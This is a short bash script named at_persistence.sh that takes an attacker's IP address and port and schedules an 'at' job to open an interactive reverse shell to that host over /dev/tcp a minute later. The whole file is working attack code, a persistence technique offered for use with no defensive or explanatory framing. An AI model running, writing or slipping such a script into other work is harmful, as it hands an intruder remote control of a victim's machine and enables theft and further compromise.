#!/bin/bash
# at_persistence.sh - Schedule an 'at' job to execute a reverse shell.
if [ -z "$1" ] || [ -z "$2" ]; then
   echo "Usage: $0 <attacker_ip> <attacker_port>"
   exit 1
fi
echo "Scheduling at job for reverse shell to $1:$2..."
echo "bash -i >& /dev/tcp/$1/$2 0>&1" | at now + 1 minute
